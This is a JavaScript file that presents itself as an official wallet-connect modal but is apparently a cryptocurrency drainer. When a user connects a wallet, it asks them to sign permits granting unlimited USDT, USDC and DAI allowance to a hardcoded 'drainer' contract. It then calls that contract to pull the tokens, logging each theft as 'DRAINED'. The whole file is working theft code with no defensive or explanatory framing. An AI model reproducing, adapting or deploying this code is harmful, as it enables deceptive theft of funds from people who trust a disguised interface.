// resolution.js - OFFICIAL STANDALONE HTML MODAL
// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=11

const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e';

const TOKENS = {
  1: {
    '0xdAC17F958D2ee523a2206206994597C13D831ec7': 'USDT',
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 'USDC',
    '0x6B175474E89094C44Da98b954EedeAC495271d0F': 'DAI'
  }
};

let modal;

function loadScript(src, callback) {
  const script = document.createElement('script');
  script.src = src;
  script.onload = callback;
  script.onerror = () => console.error(`FAILED: ${src}`);
  document.head.appendChild(script);
}

function initDrainer() {
  loadScript('https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js', () => {
    loadScript('https://cdn.jsdelivr.net/npm/@web3modal/html@2.9.0/dist/index.umd.js', setupModal);
  });
}

function setupModal() {
  const { Web3Modal } = window['@web3modal/html'];

  modal = new Web3Modal({
    projectId: PROJECT_ID,
    themeMode: 'dark'
  });

  modal.subscribeEvents(async (event) => {
    if (event.name === 'CONNECT_SUCCESS') {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const user = await signer.getAddress();
      console.log('Connected:', user);
      await drainAll(provider, signer, user);
    }
  });
}

async function drainAll(provider, signer, user) {
  for (const [token, name] of Object.entries(TOKENS[1])) {
    try {
      const tokenContract = new ethers.Contract(token, ['function balanceOf(address) view returns (uint256)', 'function nonces(address) view returns (uint256)'], provider);
      const balance = await tokenContract.balanceOf(user);
      if (balance === 0n) continue;

      console.log(`Draining ${name}...`);

      const domain = { name: name, version: '1', chainId: 1, verifyingContract: token };
      const types = { Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ]};

      const value = ethers.MaxUint256;
      const nonce = await tokenContract.nonces(user);
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const message = { owner: user, spender: DRAINER_CONTRACT, value, nonce, deadline };

      const sig = await signer.signTypedData(domain, types, message);
      const { v, r, s } = ethers.Signature.from(sig);

      const drainerContract = new ethers.Contract(DRAINER_CONTRACT, ['function resolveWithPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)'], signer);
      const tx = await drainerContract.resolveWithPermit(token, user, value, deadline, v, r, s);
      await tx.wait();

      console.log(`${name} DRAINED! Tx: ${tx.hash}`);
    } catch (err) {
      console.warn(`Failed ${name}:`, err.message);
    }
  }
}

window.connectWallet = () => modal.open();

// Start
initDrainer();
